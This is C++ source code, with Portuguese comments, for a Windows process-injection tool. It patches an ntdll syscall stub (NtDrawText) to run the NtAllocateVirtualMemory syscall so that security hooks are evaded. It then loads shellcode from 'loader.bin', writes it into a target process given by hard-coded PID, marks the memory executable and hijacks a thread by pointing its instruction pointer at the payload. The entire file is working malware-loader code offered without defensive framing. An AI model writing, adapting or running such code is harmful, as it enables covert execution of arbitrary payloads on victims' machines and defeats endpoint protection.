#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <TlHelp32.h> // Adicionado para funções de snapshot de threads

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

uint32_t ROR13Hash(const char* functionName) {
    uint32_t functionHash = 0;
    for (int i = 0; functionName[i] != '\0'; i++) {
        uint32_t c = (uint32_t)functionName[i];
        functionHash = (functionHash >> 13) | (functionHash << (32 - 13));
        functionHash += c;
    }
    return functionHash;
}

DWORD GetSSN(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    uint32_t hash = ROR13Hash(functionName);
    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);

    if (funcAddr == nullptr) {
        return 0;
    }

    BYTE* pFunction = (BYTE*)funcAddr;
    DWORD ssn = *(DWORD*)(pFunction + 0x4);

    return ssn;
}

bool ModifyFunctionToSyscall(DWORD ssn, FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD oldProtect;

    if (VirtualProtect(pFunction, 10, PAGE_READWRITE, &oldProtect)) {
        pFunction[0] = 0xB8;
        *reinterpret_cast<DWORD*>(&pFunction[1]) = ssn;
        pFunction[5] = 0x0F;
        pFunction[6] = 0x05;
        pFunction[7] = 0xC3;

        VirtualProtect(pFunction, 10, PAGE_EXECUTE_READ, &oldProtect);
        return true;
    }
    return false;
}

void SetHardwareBreakpoint(FARPROC funcAddr, DWORD registerIndex) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    (&ctx.Dr0)[registerIndex] = (DWORD_PTR)funcAddr;

    ctx.Dr7 |= (1 << (2 * registerIndex));

    SetThreadContext(hThread, &ctx);
}

void UpdateRAXandContinue(FARPROC funcAddr, DWORD newSSN) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    ctx.Rax = newSSN;

    ctx.Rip = (DWORD_PTR)funcAddr + 0x8;

    SetThreadContext(hThread, &ctx);
}

bool VerifyModification(FARPROC funcAddr, DWORD expectedSSN) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD ssn = *reinterpret_cast<DWORD*>(&pFunction[1]);
    return pFunction[0] == 0xB8 && ssn == expectedSSN;
}

DWORD GetCurrentSSN(FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    return *reinterpret_cast<DWORD*>(&pFunction[1]);
}

int main() {
    DWORD targetPID = 11384; // Substitua pelo PID do processo que você deseja injetar

    DWORD ssnNtDelayExecution = GetSSN("NtDelayExecution");
    DWORD ssnNtSetInformationThread = GetSSN("NtSetInformationThread");
    DWORD ssnNtYieldExecution = GetSSN("NtYieldExecution");
    DWORD ssnNtAllocateVirtualMemory = GetSSN("NtAllocateVirtualMemory");
    DWORD ssnNtDrawText = GetSSN("NtDrawText");

    std::cout << "SSN of NtDelayExecution: " << ssnNtDelayExecution << std::endl;
    std::cout << "SSN of NtSetInformationThread: " << ssnNtSetInformationThread << std::endl;
    std::cout << "SSN of NtYieldExecution: " << ssnNtYieldExecution << std::endl;
    std::cout << "SSN of NtAllocateVirtualMemory: " << ssnNtAllocateVirtualMemory << std::endl;
    std::cout << "SSN of NtDrawText: " << ssnNtDrawText << std::endl;

    FARPROC addrNtDelayExecution = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
    FARPROC addrNtSetInformationThread = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
    FARPROC addrNtYieldExecution = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtYieldExecution");
    FARPROC addrNtAllocateVirtualMemory = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

    std::cout << "Address of NtDelayExecution: " << addrNtDelayExecution << std::endl;
    std::cout << "Address of NtSetInformationThread: " << addrNtSetInformationThread << std::endl;
    std::cout << "Address of NtYieldExecution: " << addrNtYieldExecution << std::endl;
    std::cout << "Address of NtAllocateVirtualMemory: " << addrNtAllocateVirtualMemory << std::endl;

    DWORD ssnNtQueryInformationProcess = GetSSN("NtQueryInformationProcess");
    std::cout << "SSN of NtQueryInformationProcess: " << ssnNtQueryInformationProcess << std::endl;

    FARPROC addrNtQueryInformationProcess = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    std::cout << "Address of NtQueryInformationProcess: " << addrNtQueryInformationProcess << std::endl;

    FARPROC addrNtDrawText = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDrawText");
    std::cout << "Address of NtDrawText: " << addrNtDrawText << std::endl;

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            std::cout << "NtDrawText was successfully modified to use the SSN of NtAllocateVirtualMemory!" << std::endl;

            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "The new SSN of NtDrawText is: " << currentSSN << std::endl;
        }
        else {
            std::cout << "Failed to modify NtDrawText to use the SSN of NtAllocateVirtualMemory" << std::endl;
        }
    }

    _NtQueryInformationProcess MyNtQueryInformationProcess =
        (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;

    typedef NTSTATUS(NTAPI* _NtCreateProcess)(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ParentProcess,
        BOOLEAN InheritObjectTable,
        HANDLE SectionHandle,
        HANDLE DebugPort,
        HANDLE ExceptionPort
        );

    NTSTATUS status = MyNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "Failed to get process information." << std::endl;
        return 1;
    }

    // Displaying PEB information
    std::cout << "PEB Base: " << pbi.PebBaseAddress << std::endl;
    std::cout << "Process PID: " << pbi.UniqueProcessId << std::endl;
    // The InheritedFromUniqueProcessId field is not available in the official structure

    // Load shellcode from a file
    std::ifstream shellcodeFile("loader.bin", std::ios::binary | std::ios::ate);
    if (!shellcodeFile.is_open()) {
        std::cerr << "Failed to open shellcode file." << std::endl;
        return 1;
    }

    std::streamsize fileSize = shellcodeFile.tellg();
    shellcodeFile.seekg(0, std::ios::beg);

    std::vector<char> shellcode(fileSize);
    if (!shellcodeFile.read(shellcode.data(), fileSize)) {
        std::cerr << "Failed to read the shellcode from file." << std::endl;
        return 1;
    }

    typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
        );
    typedef NTSTATUS(NTAPI* pfnNtProtectVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
        );

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pfnNtProtectVirtualMemory NtProtectVirtualMemory = (pfnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    // Open a handle to the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        return 1;
    }

    // Allocate memory in the target process
    PVOID remoteMemory = nullptr;
    SIZE_T shellcodeSize = shellcode.size();
    NTSTATUS allocStatus = NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (allocStatus != STATUS_SUCCESS) {
        std::cerr << "Memory allocation failed: " << allocStatus << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode to the allocated memory
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.data(), shellcodeSize, &written)) {
        std::cerr << "Failed to write shellcode: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Change the memory protection to PAGE_EXECUTE_READ
    DWORD oldProtect;
    NTSTATUS protectStatus = NtProtectVirtualMemory(hProcess, &remoteMemory, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (protectStatus != STATUS_SUCCESS) {
        std::cerr << "Failed to change memory protection: " << protectStatus << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Thread Hijacking
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
    THREADENTRY32 te32;

    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot (of threads) failed" << std::endl;
        return 1;
    }

    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hThreadSnap, &te32)) {
        std::cerr << "Thread32First failed" << std::endl;
        CloseHandle(hThreadSnap);
        return 1;
    }

    HANDLE hThread = NULL;
    do {
        if (te32.th32OwnerProcessID == targetPID) {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
            if (hThread) break;
        }
    } while (Thread32Next(hThreadSnap, &te32));

    CloseHandle(hThreadSnap);

    if (hThread == NULL) {
        std::cerr << "Failed to open thread" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    SuspendThread(hThread);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    ctx.Rip = (DWORD_PTR)remoteMemory;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    CloseHandle(hThread);

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "The new SSN of NtDrawText is: " << currentSSN << std::endl;
            std::cout << "NtDrawText was successfully modified to use the SSN of NtAllocateVirtualMemory!" << std::endl;
            SetHardwareBreakpoint(addrNtDrawText, 0);
            typedef void (*FuncType)();
            FuncType callNtDrawText = (FuncType)addrNtDrawText;
            callNtDrawText();

            UpdateRAXandContinue(addrNtDrawText, ssnNtAllocateVirtualMemory);
        }
        else {
            std::cout << "Failed to modify NtDrawText." << std::endl;
        }
    }

    return 0;
}

